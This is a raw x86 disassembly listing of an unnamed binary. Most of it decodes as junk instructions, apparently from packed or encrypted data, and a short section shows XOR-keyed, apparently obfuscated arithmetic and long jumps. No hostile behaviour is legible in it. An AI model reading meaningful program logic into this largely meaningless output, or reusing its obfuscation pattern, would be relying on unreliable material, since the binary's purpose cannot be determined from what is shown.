  41eb39:	adc    BYTE PTR [esi-0x4642f3e],ah
  41eb3f:	test   BYTE PTR [ebp-0xd],cl
  41eb42:	adc    BYTE PTR [eax],bl
  41eb44:	loope  0x41eb06
  41eb46:	pushf  
  41eb47:	adc    esi,DWORD PTR [ebx+0x73]
  41eb4a:	cmp    edx,DWORD PTR [eax+esi*4]
  41eb4d:	(bad)  
  41eb4e:	cmp    eax,0x10584aae
  41eb53:	mov    bh,BYTE PTR [edx+0x14dbe4ac]
  41eb59:	pop    ss
  41eb5a:	mov    dl,0x8f
  41eb5c:	xchg   ecx,eax
  41eb5d:	sbb    ebx,ebx
  41eb5f:	test   BYTE PTR [edx+0x1d76f9d4],0x2c
  41eb66:	jge    0x41eb4e
  41eb68:	stc    
  41eb69:	clc    
  41eb6a:	push   edi
  41eb6b:	adc    dh,BYTE PTR [edi-0x18ec402b]
  41eb71:	or     eax,0x3bf52b57
  41eb76:	jl     0x41ebe4
  41eb78:	jecxz  0x41eb14
  41eb7a:	push   edx
  41eb7b:	sahf   
  41eb7c:	les    ecx,FWORD PTR [edi+edx*4-0x74b4b2ef]
  41eb83:	lods   eax,DWORD PTR ss:[esi]
  41eb85:	inc    edi
  41eb86:	and    esi,ebp
  41eb88:	cs popa 
  41eb8a:	xchg   esi,eax
  41eb8b:	mov    eax,0x7bdf4a23
  41eb90:	imul   ebp,DWORD PTR [edi+0x43e68d66],0xb15a3f6f
  41eb9a:	pushf  
  41eb9b:	xchg   ecx,eax
  41eb9c:	lock retf 0xc578
  41eba0:	and    BYTE PTR [ebp+0x2d],ah
  41eba3:	mov    esi,0x9518d1ae
  41eba8:	pop    ebp
  41eba9:	daa    
  41ebaa:	loopne 0x41eb66
  41ebac:	stos   BYTE PTR es:[edi],al
  41ebad:	test   DWORD PTR [ebp-0x621b68ff],ebp
  41ebb3:	jge    0x41ebd9
  41ebb5:	adc    eax,0xe6601dc4
  41ebba:	cmp    eax,0x69293cbe
  41ebbf:	leave  
  41ebc0:	sbb    bh,0xd0
  41ebc3:	in     al,dx
  41ebc4:	aas    
  41ebc5:	and    ecx,edi
  41ebc7:	dec    eax
  41ebc8:	xchg   ebp,eax
  41ebc9:	ins    BYTE PTR es:[edi],dx
  41ebca:	xor    BYTE PTR [ecx+0x5],bl
  41ebcd:	jnp    0x41ebba
  41ebcf:	pop    ebp
  41ebd0:	or     BYTE PTR [eax+ebx*8+0x43afcfe1],bl
  41ebd7:	pop    es
  41ebd8:	mov    ecx,0xd3a7d948
  41ebdd:	jmp    0x41ec21
  41ebdf:	inc    esi
  41ebe0:	out    dx,al
  41ebe1:	mov    cs,WORD PTR [eax+eiz*4+0x311d20e5]
  41ebe8:	(bad)  
  41ebe9:	or     bl,dh
  41ebeb:	pop    ebp
  41ebec:	data16 arpl bx,bx
  41ebef:	sub    ah,dh
  41ebf1:	adc    eax,0xbda472e7
  41ebf6:	retf   
  41ebf7:	or     eax,0xaca754e4
  41ebfc:	(bad)  
  41ebfd:	or     al,0x26
  41ebff:	mov    bh,BYTE PTR [esi]
  41ec01:	cmp    edi,DWORD PTR [esi-0x21]
  41ec04:	out    0x6d,eax
  41ec06:	ins    DWORD PTR es:[edi],dx
  41ec07:	leave  
  41ec08:	stc    
  41ec09:	ds push 0xffffffd9
  41ec0c:	sti    
  41ec0d:	xchg   esi,eax
  41ec0e:	ret    0x3102
  41ec11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec12:	inc    esi
  41ec13:	pop    edx
  41ec14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec16:	rol    eax,1
  41ec18:	lahf   
  41ec19:	or     eax,0xa6a2cd01
  41ec1e:	ins    DWORD PTR es:[edi],dx
  41ec1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec20:	xchg   ecx,eax
  41ec21:	cdq    
  41ec22:	lahf   
  41ec23:	add    ebx,esp
  41ec25:	test   al,bl
  41ec27:	sar    DWORD PTR [ebx+0x23],1
  41ec2a:	je     0x41ebf2
  41ec2c:	xor    ecx,ebp
  41ec2e:	xchg   BYTE PTR [eax-0x1628101],al
  41ec34:	add    eax,0x6477e4c8
  41ec39:	cmc    
  41ec3a:	mov    bh,0x76
  41ec3c:	pop    edi
  41ec3d:	and    edx,DWORD PTR [edi+0x72]
  41ec40:	(bad)  
  41ec41:	mov    esp,0xc327fbec
  41ec46:	loopne 0x41ebe5
  41ec48:	ret    
  41ec49:	adc    al,0x33
  41ec4b:	cli    
  41ec4c:	sbb    eax,0xf73e178a
  41ec51:	cmp    BYTE PTR [edi],0x60
  41ec54:	xchg   ebx,eax
  41ec55:	jecxz  0x41ec9f
  41ec57:	push   0x3a
  41ec59:	xor    eax,0x5c6f6faf
  41ec5e:	cmp    esi,edi
  41ec60:	sub    al,0x1f
  41ec62:	lock push es
  41ec64:	push   DWORD PTR [esi+0x6bac0755]
  41ec6a:	sub    al,0x98
  41ec6c:	jg     0x41ecb9
  41ec6e:	hlt    
  41ec6f:	cld    
  41ec70:	mov    BYTE PTR [eax],cl
  41ec72:	sti    
  41ec73:	aas    
  41ec74:	inc    eax
  41ec75:	adc    dh,BYTE PTR [eax-0x1cb92acc]
  41ec7b:	test   DWORD PTR [edx-0x1b758988],edx
  41ec81:	or     ah,BYTE PTR [ecx]
  41ec83:	adc    al,0x4c
  41ec85:	lock in eax,0xe0
  41ec88:	out    dx,al
  41ec89:	pop    ds
  41ec8a:	xchg   esi,eax
  41ec8b:	add    al,BYTE PTR [ebx-0xf]
  41ec8e:	leave  
  41ec8f:	std    
  41ec90:	arpl   WORD PTR [eax],si
  41ec92:	inc    ebx
  41ec93:	rcr    DWORD PTR cs:[edx-0x3b],1
  41ec97:	mov    bl,BYTE PTR [ecx-0x29]
  41ec9a:	int    0x93
  41ec9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec9d:	or     ecx,DWORD PTR [eax]
  41ec9f:	imul   bl
  41eca1:	(bad)  
  41eca2:	rol    DWORD PTR [ebx+edx*2-0x6ddb0437],cl
  41eca9:	mov    ebx,0x5cff9ec1
  41ecae:	jl     0x41ec56
  41ecb0:	add    DWORD PTR [ebx-0x762403a4],esi
  41ecb6:	sub    ch,ch
  41ecb8:	sbb    esi,edi
  41ecba:	jb     0x41eced
  41ecbc:	lods   eax,DWORD PTR ds:[esi]
  41ecbd:	out    dx,eax
  41ecbe:	add    ch,BYTE PTR [ebp-0x70]
  41ecc1:	js     0x41ec4e
  41ecc3:	cmp    al,0xd7
  41ecc5:	and    dl,BYTE PTR [esi-0x175b2a28]
  41eccb:	mov    edi,0x8682c08
  41ecd0:	ss cwde 
  41ecd2:	aam    0xc7
  41ecd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecd5:	cmp    bl,BYTE PTR [eax-0x34]
  41ecd8:	scas   eax,DWORD PTR es:[edi]
  41ecd9:	lods   eax,DWORD PTR ds:[esi]
  41ecda:	(bad)  
  41ecdb:	adc    eax,0x483728ae
  41ece0:	mov    dl,0x68
  41ece2:	sub    al,0xd2
  41ece4:	mov    dl,0xc0
  41ece6:	cwde   
  41ece7:	xchg   esp,eax
  41ece8:	test   DWORD PTR [ecx-0x1a],eax
  41eceb:	(bad)  
  41ecec:	into   
  41eced:	sbb    DWORD PTR [ebx],0xd350084c
  41ecf3:	or     eax,0x3a63554e
  41ecf8:	int    0xa9
  41ecfa:	pop    edx
  41ecfb:	dec    eax
  41ecfc:	mov    ds:0x33d72229,eax
  41ed01:	das    
  41ed02:	fcomp  st(1)
  41ed04:	cdq    
  41ed05:	sub    ah,BYTE PTR [ecx+ebx*1]
  41ed08:	lahf   
  41ed09:	push   es
  41ed0a:	out    dx,al
  41ed0b:	ss pop es
  41ed0d:	xchg   edi,eax
  41ed0e:	hlt    
  41ed0f:	stc    
  41ed10:	and    eax,0xdfc7eb30
  41ed15:	leave  
  41ed16:	xchg   ebx,eax
  41ed17:	pop    ebx
  41ed18:	push   ss
  41ed19:	xchg   ebp,eax
  41ed1a:	jne    0x41ed9a
  41ed1c:	(bad)  
  41ed1d:	pop    ebx
  41ed1e:	inc    ebx
  41ed1f:	jg     0x41ed09
  41ed21:	mov    esp,0xf6aa8883
  41ed26:	pop    ebp
  41ed27:	sbb    edi,DWORD PTR [ecx-0x27ba36af]
  41ed2d:	xlat   BYTE PTR ds:[ebx]
  41ed2e:	stos   DWORD PTR es:[edi],eax
  41ed2f:	xor    ah,BYTE PTR [ebx+edi*2+0x52]
  41ed33:	aad    0xc9
  41ed35:	dec    edi
  41ed36:	inc    eax
  41ed37:	xor    BYTE PTR [ecx+0x5b952226],ah
  41ed3d:	xor    DWORD PTR [esi+0x7c],ebx
  41ed40:	out    dx,eax
  41ed41:	inc    esi
  41ed42:	pminub mm0,QWORD PTR [ebp-0x1d7809cb]
  41ed49:	jo     0x41ed36
  41ed4b:	test   al,0x57
  41ed4d:	(bad)  
  41ed4e:	rcl    BYTE PTR [ecx],cl
  41ed50:	(bad)  
  41ed51:	and    al,0xd5
  41ed53:	xchg   esp,eax
  41ed54:	call   0x6c2a:0x33d23940
  41ed5b:	cld    
  41ed5c:	sub    al,0x99
  41ed5e:	mov    al,0xf6
  41ed60:	xor    al,bl
  41ed62:	sub    ah,0x61
  41ed65:	xor    al,0x3e
  41ed67:	ja     0x41ed55
  41ed69:	push   es
  41ed6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed6b:	mov    ah,0x22
  41ed6d:	add    esp,esi
  41ed6f:	mov    BYTE PTR [eax-0x36290676],ah
  41ed75:	xchg   edx,eax
  41ed76:	mov    dh,0xb
  41ed78:	(bad)  
  41ed79:	mov    al,0xde
  41ed7b:	mov    ds:0xf7e12c9f,eax
  41ed80:	in     eax,dx
  41ed81:	int    0x4e
  41ed83:	aas    
  41ed84:	outs   dx,DWORD PTR ds:[esi]
  41ed85:	popa   
  41ed86:	test   al,0xf1
  41ed88:	push   eax
  41ed89:	jmp    0x41ed14
  41ed8b:	dec    esp
  41ed8c:	push   ecx
  41ed8d:	adc    BYTE PTR [ecx-0xb71e7d3],al
  41ed93:	fld    DWORD PTR [eax]
  41ed95:	mov    ds:0xf1fc6ebd,al
  41ed9a:	les    ecx,FWORD PTR [ebx]
  41ed9c:	pop    eax
  41ed9d:	icebp  
  41ed9e:	inc    esi
  41ed9f:	(bad)  
  41eda1:	dec    ebp
  41eda2:	arpl   WORD PTR [ebx+0x6e],sp
  41eda5:	rcr    BYTE PTR [ebp-0x1a0c2c3a],cl
  41edab:	rcr    BYTE PTR [edx-0x51],cl
  41edae:	xchg   esi,eax
  41edaf:	or     esp,DWORD PTR [eax+0x4667d03]
  41edb5:	xchg   ebp,esp
  41edb7:	loopne 0x41ed3e
  41edb9:	pop    ecx
  41edba:	rcl    DWORD PTR [esi-0x46],cl
  41edbd:	call   0x5e60:0x8d94c821
  41edc4:	aas    
  41edc5:	stc    
  41edc6:	xchg   ebx,eax
  41edc7:	mov    WORD PTR [ebp+ecx*1-0x6356357c],fs
  41edce:	dec    ebx
  41edcf:	imul   eax
  41edd1:	sbb    BYTE PTR [esp+edx*2],al
  41edd4:	nop
  41edd5:	int3   
  41edd6:	sbb    BYTE PTR [eax-0x7ef0fec5],cl
  41eddc:	pop    ebx
  41eddd:	mov    al,0x9a
  41eddf:	cli    
  41ede0:	scas   eax,DWORD PTR es:[edi]
  41ede1:	fbstp  TBYTE PTR [eax-0x4582561c]
  41ede7:	rcr    DWORD PTR [eax-0x2d],0xdd
  41edeb:	scas   eax,DWORD PTR es:[edi]
  41edec:	je     0x41edc8
  41edee:	hlt    
  41edef:	cdq    
  41edf0:	and    al,dh
  41edf2:	or     DWORD PTR [edx],0x6566ac99
  41edf8:	mov    al,ds:0xceee32aa
  41edfd:	(bad)  
  41edfe:	aad    0xf2
  41ee00:	out    0xfd,al
  41ee02:	aad    0xee
  41ee04:	or     DWORD PTR [esi+0x4aada86b],eax
  41ee0a:	add    BYTE PTR [ecx],dl
  41ee0c:	data16 ffreep st(5)
  41ee0f:	mov    ebp,0x571e106e
  41ee14:	(bad)  
  41ee15:	in     al,0x18
  41ee17:	jb     0x41ede4
  41ee19:	in     eax,dx
  41ee1a:	pop    eax
  41ee1b:	hlt    
  41ee1c:	inc    esi
  41ee1d:	adc    eax,0xf6147c44
  41ee22:	test   al,0x8a
  41ee24:	fs (bad) 
  41ee26:	cmp    eax,0x58fd1861
  41ee2b:	sbb    DWORD PTR [ecx-0x3d],0xbc725f4c
  41ee32:	add    eax,0x356693ea
  41ee37:	jnp    0x41ee80
  41ee39:	inc    ebp
  41ee3a:	fld    TBYTE PTR [eax+0x7154003]
  41ee40:	popf   
  41ee41:	pop    ecx
  41ee42:	adc    al,0xb5
  41ee44:	lods   al,BYTE PTR ds:[esi]
  41ee45:	cdq    
  41ee46:	cmp    eax,0xa671e8f5
  41ee4b:	or     BYTE PTR ds:0x7b7e967c,bl
  41ee51:	mov    DWORD PTR [eax-0x108645b4],ebx
  41ee57:	pop    esp
  41ee58:	repz jmp 0x4e1a:0x5d2c9a68
  41ee60:	lock and eax,0x82633afa
  41ee66:	sbb    BYTE PTR [ecx+eiz*8-0xdd6ab17],ah
  41ee6d:	dec    esi
  41ee6e:	clc    
  41ee6f:	mov    ds:0xe5782332,eax
  41ee74:	or     dl,BYTE PTR [ebp-0x6a]
  41ee77:	test   eax,0x7c688b72
  41ee7c:	pop    esp
  41ee7d:	iret   
  41ee7e:	fwait
  41ee7f:	clc    
  41ee80:	loop   0x41eefc
  41ee82:	inc    ebx
  41ee83:	push   ebp
  41ee84:	push   cs
  41ee85:	xchg   ebp,eax
  41ee86:	test   BYTE PTR [edx-0x87f719e],dh
  41ee8c:	push   ebx
  41ee8d:	stc    
  41ee8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee8f:	fs dec edi
  41ee91:	push   ebp
  41ee92:	icebp  
  41ee93:	ds xchg edi,eax
  41ee95:	jne    0x41ee70
  41ee97:	daa    
  41ee98:	add    BYTE PTR [ecx+0x6fe206b0],ah
  41ee9e:	add    eax,0x648527d5
  41eea3:	cmp    dl,dh
  41eea5:	hlt    
  41eea6:	mov    ch,0xeb
  41eea8:	pop    ds
  41eea9:	mov    eax,ds:0xd10d85be
  41eeae:	cmc    
  41eeaf:	mov    esi,0xe47de81
  41eeb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eeb5:	(bad)  
  41eeb6:	mov    cl,0x65
  41eeb8:	(bad)  [edi*8-0x1f0c496f]
  41eebf:	sbb    DWORD PTR [edx],ebp
  41eec1:	inc    esi
  41eec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec3:	mov    dl,0x2
  41eec5:	fwait
  41eec6:	cmp    al,0xb1
  41eec8:	lahf   
  41eec9:	retf   0x4c3
  41eecc:	or     ebp,DWORD PTR [ebp+0x79]
  41eecf:	dec    esp
  41eed0:	push   edi
  41eed1:	cwde   
  41eed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eed3:	sbb    al,0xd0
  41eed5:	das    
  41eed6:	aad    0x70
  41eed8:	jge    0x41ee86
  41eeda:	mov    WORD PTR [esi+0x207c2928],ss
  41eee0:	or     dh,BYTE PTR [edx-0x70262eb5]
  41eee6:	xor    ch,bl
  41eee8:	lock sub BYTE PTR [ebp+ebx*1-0x1d],bl
  41eeed:	std    
  41eeee:	call   0x7283:0x3e1303ba
  41eef5:	cmp    DWORD PTR [ebx+eax*2+0x45],ebx
  41eef9:	ja     0x41ef4d
  41eefb:	sbb    al,0xe5
  41eefd:	mov    ds:0xe49b0f18,eax
  41ef02:	call   FWORD PTR [eax]
  41ef04:	shr    DWORD PTR [edx],0xe6
  41ef07:	jns    0x41ef41
  41ef09:	push   ebp
  41ef0a:	cli    
  41ef0b:	mov    ebx,0x90b3dfb5
  41ef10:	xchg   ebx,eax
  41ef11:	mov    dl,0x64
  41ef13:	aas    
  41ef14:	(bad)  
  41ef15:	pop    ebp
  41ef16:	int    0xfb
  41ef18:	aam    0xea
  41ef1a:	and    cl,BYTE PTR es:[esi-0x3b62e7f0]
  41ef21:	mov    ecx,0x5c4f389d
  41ef26:	out    0x97,al
  41ef28:	xor    BYTE PTR [edx-0x2719f051],al
  41ef2e:	xchg   ecx,eax
  41ef2f:	imul   edx,DWORD PTR [esi],0xffffffd3
  41ef32:	and    DWORD PTR [ebx-0x4f40f1c3],edx
  41ef38:	test   DWORD PTR [bp+si-0x60],0x2e8d213c
  41ef40:	fimul  WORD PTR [ecx+0x3a4b40d6]
  41ef46:	ins    BYTE PTR es:[edi],dx
  41ef47:	push   esp
  41ef48:	pop    edi
  41ef49:	mov    BYTE PTR [edi],ah
  41ef4b:	and    al,0xdf
  41ef4d:	mov    ecx,0x968e78f1
  41ef52:	test   eax,0x18608b8a
  41ef57:	xchg   esi,eax
  41ef58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef59:	mov    DWORD PTR [ebp+0x4fcfe6de],eax
  41ef5f:	mov    esi,0x491399c4
  41ef64:	lock hlt 
  41ef66:	inc    ebx
  41ef67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef68:	pop    es
  41ef69:	xor    eax,0xd63933a7
  41ef6e:	dec    ebx
  41ef6f:	aas    
  41ef70:	pop    esi
  41ef71:	xor    esi,DWORD PTR [ebx+0x5713c018]
  41ef77:	or     ecx,DWORD PTR [ebx-0x41046597]
  41ef7d:	je     0x41ef2d
  41ef7f:	pop    eax
  41ef80:	xor    eax,0x36ffc0f2
  41ef85:	adc    DWORD PTR [ecx+0x7f],ebx
  41ef88:	mov    al,0x41
  41ef8a:	(bad)  
  41ef8b:	out    0x4e,eax
  41ef8d:	mov    ebx,0x74dbea3a
  41ef92:	or     eax,0xa52ba050
  41ef97:	mov    ebx,0x94847cbb
  41ef9c:	mov    DWORD PTR [ebp+ebp*1+0x74],edi
  41efa0:	xor    cl,al
  41efa2:	adc    eax,edx
  41efa4:	(bad)  
  41efa5:	mov    ebx,0x513de899
  41efaa:	retf   
  41efab:	js     0x41f013
  41efad:	push   ebp
  41efae:	xor    al,BYTE PTR [esi]
  41efb0:	outs   dx,BYTE PTR ds:[esi]
  41efb1:	test   al,0x7f
  41efb3:	push   esi
  41efb4:	push   ebp
  41efb5:	addr16 lock add ebx,esi
  41efb9:	into   
  41efba:	ins    DWORD PTR es:[edi],dx
  41efbb:	push   eax
  41efbc:	aas    
  41efbd:	mov    edx,DWORD PTR [edi]
  41efbf:	mov    bl,0xce
  41efc1:	call   0xed5c:0x2a332c6e
  41efc8:	ins    DWORD PTR es:[edi],dx
  41efc9:	or     eax,0xda3becc0
  41efce:	add    esi,DWORD PTR [ebx+0x44]
  41efd1:	ds ret 0xb797
  41efd5:	push   ss
  41efd6:	cmp    al,0xd5
  41efd8:	repz (bad) 
  41efda:	out    dx,al
  41efdb:	fdivr  DWORD PTR [edx]
  41efdd:	out    dx,eax
  41efde:	lahf   
  41efdf:	or     eax,0x565dd4f4
  41efe4:	fldenv [ecx-0x35c4f2f9]
  41efea:	pusha  
  41efeb:	enter  0xa6a6,0x3
  41efef:	clc    
  41eff0:	(bad)  
  41eff1:	lods   al,BYTE PTR ds:[esi]
  41eff2:	leave  
  41eff3:	or     DWORD PTR [ecx+ebx*4+0x459ab900],edi
  41effa:	or     eax,0x335fc64a
  41efff:	enter  0xce03,0xf
  41f003:	test   DWORD PTR [ebx-0x24],esp
  41f006:	(bad)  
  41f007:	dec    DWORD PTR [ebx+0x4d89f44d]
  41f00d:	or     cl,ch
  41f00f:	sub    eax,0x8b000000
  41f014:	dec    ebp
  41f015:	or     BYTE PTR [ebx-0x37cc07ab],cl
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0xefa46403
  41f0bf:	dec    ecx
  41f0c0:	adc    BYTE PTR [ecx-0x28],0x61
  41f0c4:	bound  edi,QWORD PTR [edi+ebx*2]
  41f0c7:	bound  esp,QWORD PTR [edx-0x5]
  41f0ca:	jecxz  0x41f0dc
  41f0cc:	std    
  41f0cd:	arpl   WORD PTR [eax+eiz*8+0x7f],ax
  41f0d1:	mov    al,0x2c
  41f0d3:	dec    esp
  41f0d4:	cmp    eax,0xd0aee74b
  41f0d9:	adc    DWORD PTR [edx-0x44dc9c83],esp
  41f0df:	rcr    BYTE PTR [esi+0x7123838f],cl
  41f0e5:	les    ebx,FWORD PTR [ecx-0x43]
  41f0e8:	cmp    eax,0xd65a860f
  41f0ed:	push   DWORD PTR [ecx-0x21be95aa]
  41f0f3:	sbb    al,0x4b
  41f0f5:	xlat   BYTE PTR ds:[ebx]
  41f0f6:	jno    0x41f09e
  41f0f8:	clc    
  41f0f9:	adc    eax,0xcf51801b
  41f0fe:	mov    cl,0xc
  41f100:	test   DWORD PTR [edx+eiz*8-0x67],0x1e6bb33f
  41f108:	sbb    al,0x4a
  41f10a:	and    eax,0x62381c66
  41f10f:	inc    eax
  41f110:	xchg   esi,eax
  41f111:	pop    eax
  41f112:	sub    BYTE PTR [ebx],0xf2
  41f115:	in     al,0xba
  41f117:	xchg   esp,eax
  41f118:	imul   edi,DWORD PTR [ebp-0x41],0x3b
  41f11c:	loope  0x41f0e2
  41f11e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f11f:	in     al,0x87
  41f121:	mov    esp,esi
  41f123:	scas   eax,DWORD PTR es:[edi]
  41f124:	ret    
  41f125:	sar    ebx,cl
  41f127:	xor    eax,0x280c5820
  41f12c:	aaa    
  41f12d:	jne    0x41f16a
  41f12f:	(bad)  
  41f131:	add    eax,0x5a37196a
  41f136:	push   esp
  41f137:	cmp    BYTE PTR [ebx-0x1b934548],al
  41f13d:	stc    
  41f13e:	stc    
  41f13f:	mov    dh,0xae
  41f141:	add    eax,0xf6bd3929
  41f146:	cmp    ebx,DWORD PTR [edi]
  41f148:	xor    al,0x9f
  41f14a:	pop    esi
  41f14c:	fstp   DWORD PTR [edi-0x19]
  41f14f:	ins    DWORD PTR es:[edi],dx
  41f150:	imul   ebp,DWORD PTR [edx],0xffffffec
  41f153:	imul   ebp,DWORD PTR [ebp+0xe0937e4],0xbd70dbd
  41f15d:	jns    0x41f1d5
  41f15f:	les    ebx,FWORD PTR [ecx-0x2c136f4f]
  41f165:	aam    0xc5
  41f167:	adc    DWORD PTR [edx],edx
  41f169:	jp     0x41f1a8
  41f16b:	push   esp
  41f16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f16d:	mov    edi,0x8c312502
  41f172:	in     eax,dx
  41f173:	mov    ebp,0xf19d9ba7
  41f178:	imul   eax,DWORD PTR [edi+ebx*8],0xc
  41f17c:	jmp    0xfa17faa0
  41f181:	xchg   ebx,eax
  41f182:	xchg   esi,eax
  41f183:	addr16 mov ebx,0xe75117a0
  41f189:	loope  0x41f201
  41f18b:	or     DWORD PTR gs:0x35d82da9,ebx
  41f192:	sub    cl,BYTE PTR [eax+0x3624720d]
  41f198:	sub    ebp,edx
  41f19a:	(bad)  
  41f19b:	stc    
  41f19c:	pop    ecx
  41f19d:	retf   0xd151
  41f1a0:	mov    ebx,0xb5d8439f
  41f1a5:	xchg   ebp,eax
  41f1a6:	mov    bh,0xa6
  41f1a8:	xchg   BYTE PTR [esp+ebx*1],al
  41f1ab:	test   al,0xe9
  41f1ad:	jp     0x41f229
  41f1af:	or     edx,0xb9122e93
  41f1b5:	mov    eax,ds:0xe9751f11
  41f1ba:	or     DWORD PTR [edx+0x514b4da9],ebp
  41f1c0:	or     ecx,esp
  41f1c2:	xchg   esi,eax
  41f1c3:	lods   eax,DWORD PTR ds:[esi]
  41f1c4:	clc    
  41f1c5:	sar    dh,0xb7
  41f1c8:	and    DWORD PTR [ecx],0xffffffc7
  41f1cb:	pop    eax
  41f1cc:	xlat   BYTE PTR ds:[ebx]
  41f1cd:	(bad)  
  41f1ce:	xchg   edx,eax
  41f1cf:	inc    eax
  41f1d0:	sub    edx,DWORD PTR [ecx]
  41f1d2:	add    DWORD PTR [ebx+ecx*1+0x61],ecx
  41f1d6:	or     BYTE PTR [edx-0x55],ah
  41f1d9:	mov    edx,0x4c36c9a2
  41f1de:	xor    al,0x6
  41f1e0:	dec    ebx
  41f1e1:	loope  0x41f231
  41f1e3:	test   al,0x32
  41f1e5:	scas   eax,DWORD PTR es:[edi]
  41f1e6:	aad    0xf0
  41f1e8:	out    dx,eax
  41f1e9:	sub    al,0xab
  41f1eb:	jge    0x41f25b
  41f1ed:	xchg   esp,eax
  41f1ee:	and    eax,0x43639f61
  41f1f3:	int    0xf8
  41f1f5:	(bad)  
  41f1f7:	(bad)  
  41f1f8:	cmp    ecx,DWORD PTR [ebx-0x9]
  41f1fb:	fstp   st(1)
  41f1fd:	jmp    DWORD PTR ds:0xdf3db57
  41f203:	add    eax,DWORD PTR [edx]
  41f205:	gs sbb eax,0xdb85228a
  41f20b:	pop    ebp
  41f20c:	sub    BYTE PTR [eax+0x20],bl
  41f20f:	(bad)  
  41f210:	int    0x75
  41f212:	inc    ebp
  41f213:	arpl   ax,bp
  41f215:	fbstp  TBYTE PTR [ecx]
  41f217:	xor    eax,0x9a02a0a0
  41f21c:	pop    esp
  41f21d:	loope  0x41f1b6
  41f21f:	(bad)  
  41f220:	mov    ch,0x62
  41f222:	add    ecx,DWORD PTR [esi-0x49]
  41f225:	(bad)  [edx+0x4d]
  41f228:	adc    eax,0x9ecf5c29
  41f22d:	test   al,0x29
  41f22f:	xlat   BYTE PTR ds:[ebx]
  41f230:	test   BYTE PTR [ecx+edi*2],bl
  41f233:	xor    ecx,ebp
  41f235:	mov    bl,0x7a
  41f237:	xor    DWORD PTR [edx+0x5ccc40e5],ebp
  41f23d:	jno    0x41f27a
  41f23f:	mov    eax,0x829c80b5
  41f244:	lods   eax,DWORD PTR ds:[esi]
  41f245:	and    al,0x17
  41f247:	mov    dh,0x9e
  41f249:	std    
  41f24a:	and    ah,bh
  41f24c:	jb     0x41f258
  41f24e:	push   esi
  41f24f:	stc    
  41f250:	dec    ebx
  41f251:	mov    bl,0x99
  41f253:	gs call esi
  41f256:	stos   DWORD PTR es:[edi],eax
  41f257:	and    al,0xa5
  41f259:	jmp    0x8214:0xc487c7e6
  41f260:	xchg   ebx,eax
  41f261:	aam    0x1d
  41f263:	add    eax,0x7820f009
  41f268:	in     al,dx
  41f269:	inc    edi
  41f26a:	push   edx
  41f26b:	push   ebx
  41f26c:	sti    
  41f26d:	ror    DWORD PTR [ebx],0x61
  41f270:	imul   edi,DWORD PTR [ecx*2-0x59dfc1f3],0x8cef4947
  41f27b:	push   edi
  41f27c:	mov    bh,0x4a
  41f27e:	dec    eax
  41f27f:	push   0x39720c0
  41f284:	mov    edi,0x85ffe979
  41f289:	mov    cl,0xe9
  41f28b:	or     edi,DWORD PTR [edi]
  41f28d:	mov    cl,0x55
  41f28f:	pop    esi
  41f290:	fild   WORD PTR ds:0x1d2ac4c1
  41f296:	jmp    0x30ba4f8a
  41f29b:	dec    esp
  41f29c:	call   0x7699:0x8387c722
  41f2a3:	xchg   esi,eax
  41f2a4:	pop    ss
  41f2a5:	push   0xfffffffb
  41f2a7:	daa    
  41f2a8:	mov    cl,0xc
  41f2aa:	adc    al,0xa4
